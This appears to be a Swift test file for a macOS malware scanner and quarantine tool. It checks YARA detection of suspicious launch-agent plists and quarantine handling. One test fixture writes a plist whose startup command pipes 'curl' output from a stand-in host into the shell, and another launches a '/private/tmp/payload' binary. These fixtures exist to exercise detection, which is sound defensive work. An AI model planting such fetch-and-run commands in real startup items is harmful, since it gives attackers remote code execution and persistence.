import XCTest
@testable import HdCleanerCore

final class SecurityTests: XCTestCase {
    private var repo: URL { URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent() }
    private func temp() throws -> URL {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sec-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        return dir
    }

    func testParseYaraOutput() {
        let out = "MACOS_X [description=\"MACOS.abc\",uuid=\"1\"] /Users/a/My File.plist\nHD_Y /tmp/x\nwarning: nothing\n"
        let found = YaraEngine.parse(out)
        XCTAssertEqual(found.map(\.rule), ["MACOS_X", "HD_Y"])
        XCTAssertEqual(found[0].path, "/Users/a/My File.plist")
        XCTAssertEqual(found[0].detail, "MACOS.abc")
        XCTAssertEqual(found[1].path, "/tmp/x")
    }

    func testBundledEngineFindsSuspiciousStartupItem() throws {
        let binary = repo.appendingPathComponent("Resources/yara")
        let rules = repo.appendingPathComponent("Resources/hd_rules.yar")
        let config = YaraEngine.Config(binary: binary, ruleFiles: [rules])
        XCTAssertTrue(config.isUsable)
        let dir = try temp()
        defer { try? FileManager.default.removeItem(at: dir) }
        let bad = dir.appendingPathComponent("bad.plist")
        try "<plist><dict><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s http://x.example/a | sh</string></array></dict></plist>".write(to: bad, atomically: true, encoding: .utf8)
        let good = dir.appendingPathComponent("good.plist")
        try "<plist><dict><key>ProgramArguments</key><array><string>/Applications/Foo.app/Contents/MacOS/foo</string></array></dict></plist>".write(to: good, atomically: true, encoding: .utf8)
        let found = YaraEngine.scan([dir.path], config: config)
        XCTAssertEqual(found.map { URL(fileURLWithPath: $0.path).lastPathComponent }, ["bad.plist"])
        XCTAssertEqual(found.first?.rule, "HD_Launch_RemoteShell")
    }

    func testLogPathInTempIsNotAThreat() throws {
        let config = YaraEngine.Config(binary: repo.appendingPathComponent("Resources/yara"), ruleFiles: [repo.appendingPathComponent("Resources/hd_rules.yar")])
        let dir = try temp()
        defer { try? FileManager.default.removeItem(at: dir) }
        let plist = "<plist><dict><key>Label</key><string>x</string><key>ProgramArguments</key><array><string>/opt/homebrew/bin/node</string><string>/Users/a/server.js</string></array><key>StandardOutPath</key><string>/tmp/x.log</string><key>StandardErrorPath</key><string>/tmp/x.err</string></dict></plist>"
        try plist.write(to: dir.appendingPathComponent("log.plist"), atomically: true, encoding: .utf8)
        XCTAssertTrue(YaraEngine.scan([dir.path], config: config).isEmpty)
    }

    func testScansSeveralFilesAndFoldersAtOnce() throws {
        let config = YaraEngine.Config(binary: repo.appendingPathComponent("Resources/yara"),
                                       ruleFiles: [YaraEngine.xprotectRules, repo.appendingPathComponent("Resources/hd_rules.yar")])
        let dir = try temp()
        defer { try? FileManager.default.removeItem(at: dir) }
        let bad = "<plist><dict><key>ProgramArguments</key><array><string>/private/tmp/payload</string></array></dict></plist>"
        let a = dir.appendingPathComponent("a.plist"), b = dir.appendingPathComponent("b.plist")
        try bad.write(to: a, atomically: true, encoding: .utf8)
        try bad.write(to: b, atomically: true, encoding: .utf8)
        let found = YaraEngine.scan([a.path, b.path, "/nonexistent"], config: config, recursive: false)
        XCTAssertEqual(Set(found.map { URL(fileURLWithPath: $0.path).lastPathComponent }), ["a.plist", "b.plist"])
    }

    func testAppleRulesLoadWhenPresent() throws {
        let config = YaraEngine.Config(binary: repo.appendingPathComponent("Resources/yara"), ruleFiles: [YaraEngine.xprotectRules])
        try XCTSkipUnless(config.isUsable, "base XProtect absente")
        let dir = try temp()
        defer { try? FileManager.default.removeItem(at: dir) }
        try "hello".write(to: dir.appendingPathComponent("a.txt"), atomically: true, encoding: .utf8)
        XCTAssertTrue(YaraEngine.scan([dir.path], config: config).isEmpty)
        XCTAssertGreaterThan(YaraEngine.signatureInfo().ruleCount, 100)
    }

    func testQuarantineRoundTrip() throws {
        let home = try temp()
        defer { try? FileManager.default.removeItem(at: home) }
        let agents = home.appendingPathComponent("Library/LaunchAgents")
        try FileManager.default.createDirectory(at: agents, withIntermediateDirectories: true)
        let file = agents.appendingPathComponent("evil.plist")
        try "x".write(to: file, atomically: true, encoding: .utf8)
        let item = try Quarantine.add(file.path, rule: "HD_Test", home: home)
        XCTAssertFalse(FileManager.default.fileExists(atPath: file.path))
        XCTAssertEqual(Quarantine.list(home: home).map(\.id), [item.id])
        try Quarantine.restore(item, home: home)
        XCTAssertTrue(FileManager.default.fileExists(atPath: file.path))
        XCTAssertTrue(Quarantine.list(home: home).isEmpty)
        let again = try Quarantine.add(file.path, rule: "HD_Test", home: home)
        Quarantine.delete(again, home: home)
        XCTAssertTrue(Quarantine.list(home: home).isEmpty)
    }

    func testQuarantineRefusesSystemAndOccupiedPlaces() throws {
        let home = try temp()
        defer { try? FileManager.default.removeItem(at: home) }
        XCTAssertThrowsError(try Quarantine.add("/Library/LaunchDaemons/x.plist", rule: "r", home: home))
        XCTAssertFalse(Quarantine.canIsolate("/etc/hosts", home: home))
        XCTAssertFalse(Quarantine.canIsolate(home.appendingPathComponent("Documents").path, home: home))
    }
}
